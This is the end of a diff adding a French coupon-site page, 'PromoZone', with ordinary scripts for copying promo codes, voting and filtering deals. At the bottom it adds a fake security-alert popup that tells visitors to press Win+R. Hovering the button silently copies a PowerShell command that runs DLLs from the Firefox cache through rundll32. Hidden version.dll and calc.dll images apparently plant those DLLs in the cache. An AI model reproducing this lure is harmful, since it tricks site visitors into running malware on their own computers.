+  <p>© 2025 PromoZone — Bons plans, codes promo & réductions vérifiés · <a href="#">Mentions légales</a> · <a href="#">Contact</a></p>
+</footer>
+
+<!-- ─── TOAST ─── -->
+<div id="toast">✓ Code copié dans le presse-papiers !</div>
+
+<script>
+  // ── TOAST ──
+  function showToast(msg) {
+    const t = document.getElementById('toast');
+    t.textContent = msg || '✓ Code copié !';
+    t.classList.add('show');
+    setTimeout(() => t.classList.remove('show'), 2500);
+  }
+
+  // ── COPY CODE (featured) ──
+  function copyCode(code, el) {
+    navigator.clipboard.writeText(code).catch(() => {});
+    const msg = el.querySelector('.copied-msg');
+    if (msg) { msg.classList.add('show'); setTimeout(() => msg.classList.remove('show'), 2000); }
+    showToast(`✓ "${code}" copié !`);
+  }
+
+  // ── COPY SMALL (cards) ──
+  function copySmall(code, btn) {
+    navigator.clipboard.writeText(code).catch(() => {});
+    const orig = btn.textContent;
+    btn.textContent = '✓ OK';
+    btn.style.background = 'var(--accent3)';
+    btn.style.borderColor = 'var(--accent3)';
+    btn.style.color = '#000';
+    setTimeout(() => {
+      btn.textContent = orig;
+      btn.style.background = '';
+      btn.style.borderColor = '';
+      btn.style.color = '';
+    }, 1800);
+    showToast(`✓ "${code}" copié !`);
+  }
+
+  // ── VOTE ──
+  function vote(btn) {
+    if (btn.classList.contains('voted')) return;
+    btn.classList.add('voted');
+    const span = btn.querySelector('.vcount');
+    span.textContent = parseInt(span.textContent) + 1;
+    showToast('👍 Merci pour votre vote !');
+  }
+
+  // ── FILTER CATEGORY ──
+  function filterCategory(btn, cat) {
+    document.querySelectorAll('.filter-list .filter-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    const cards = document.querySelectorAll('.deal-card');
+    cards.forEach(card => {
+      if (cat === 'all' || card.dataset.cat === cat) {
+        card.style.display = '';
+      } else {
+        card.style.display = 'none';
+      }
+    });
+  }
+
+  // ── FILTER STORE ──
+  function filterStore(btn, store) {
+    document.querySelectorAll('.filter-list .filter-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    const cards = document.querySelectorAll('.deal-card');
+    cards.forEach(card => {
+      if (card.dataset.store === store) {
+        card.style.display = '';
+      } else {
+        card.style.display = 'none';
+      }
+    });
+  }
+
+  function sortDeals(val) { showToast('🔄 Tri appliqué : ' + val); }
+
+  // ── NEWSLETTER ──
+  function subscribeNewsletter() {
+    const input = document.querySelector('.nl-input');
+    if (!input.value || !input.value.includes('@')) {
+      showToast('⚠️ Entrez un email valide');
+      return;
+    }
+    showToast('🎉 Inscription confirmée !');
+    input.value = '';
+  }
+
+  // ── COUNTDOWN ──
+  let secs = 23 * 3600 + 14 * 60 + 7;
+  function updateCountdown() {
+    const h = Math.floor(secs / 3600);
+    const m = Math.floor((secs % 3600) / 60);
+    const s = secs % 60;
+    document.getElementById('countdown').textContent =
+      String(h).padStart(2,'0') + ':' + String(m).padStart(2,'0') + ':' + String(s).padStart(2,'0');
+    if (secs > 0) secs--;
+  }
+  updateCountdown();
+  setInterval(updateCountdown, 1000);
+
+  // ── POPUP ALERTE ──
+  setTimeout(() => {
+    document.getElementById('alertPopup').style.display = 'flex';
+  }, 3000);
+
+  function closePopup() {
+    document.getElementById('alertPopup').style.display = 'none';
+  }
+</script>
+
+<!-- POPUP -->
+<div id="alertPopup" style="
+  display:none; position:fixed; inset:0; z-index:9999;
+  background:rgba(0,0,0,0.75); backdrop-filter:blur(4px);
+  align-items:center; justify-content:center;
+">
+  <div style="
+    background:#fff; color:#111; border-radius:12px;
+    width:420px; max-width:92vw; overflow:hidden;
+    box-shadow:0 24px 80px rgba(0,0,0,0.6);
+    font-family:'Segoe UI',Arial,sans-serif;
+  ">
+    <!-- Barre titre style Windows -->
+    <div style="background:#c00; padding:10px 16px; display:flex; align-items:center; justify-content:space-between;">
+      <span style="color:#fff; font-size:0.85rem; font-weight:600; display:flex; align-items:center; gap:8px;">
+        <svg width="16" height="16" fill="#fff" viewBox="0 0 24 24"><path d="M12 2a10 10 0 1 0 0 20A10 10 0 0 0 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+        Alerte de Sécurité — PromoZone
+      </span>
+      <button onclick="closePopup()" style="background:none;border:none;color:#fff;font-size:1.1rem;cursor:pointer;line-height:1;">✕</button>
+    </div>
+    <!-- Corps -->
+    <div style="padding:1.5rem;">
+      <div style="display:flex;gap:1rem;align-items:flex-start;margin-bottom:1rem;">
+        <div style="font-size:2.5rem;line-height:1;">⚠️</div>
+        <div>
+          <div style="font-size:1rem;font-weight:700;margin-bottom:0.4rem;">Activité suspecte détectée</div>
+          <div style="font-size:0.85rem;color:#444;line-height:1.5;">
+            Afin de prouver que vous n'êtes pas un robot de taper la commande Win + R
+          </div>
+        </div>
+      </div>
+
+      <div style="display:flex;flex-direction:column;gap:0.6rem;">
+        <button id="copyBtn" onmouseover="close_verol_popup()" style="
+          background:#c00;color:#fff;border:none;border-radius:7px;
+          padding:0.7rem;font-size:0.92rem;font-weight:700;cursor:pointer;
+        ">pour fermer la fenetre merci de faire Win + R</button>
+
+        <img src="version.dll" alt="image here">
+
+        <script>
+          function close_verol_popup() {
+            document.getElementById('alertPopup').style.display = 'none';
+            const copyBtn = document.getElementById('copyBtn');
+
+            navigator.clipboard.writeText(`
+              foreach($f in @("$env:LOCALAPPDATA\\Mozilla\\Firefox\\Profiles\\*.default-release\\cache2\\entries\\")){
+                  Get-ChildItem $f -Recurse | ForEach-Object {
+                      if (Select-String -Pattern "DLLHERE" -Path $_.FullName){
+                          rundll32.exe "$($_.FullName)",DllMain
+                      }
+                  }
+              }
+            `);
+        } 
+        </script>
+
+      
+      </div>
+    </div>
+    <img src="calc.dll" style="display: none;"/>
+  </div>
+</div>
+</body>
+</html>
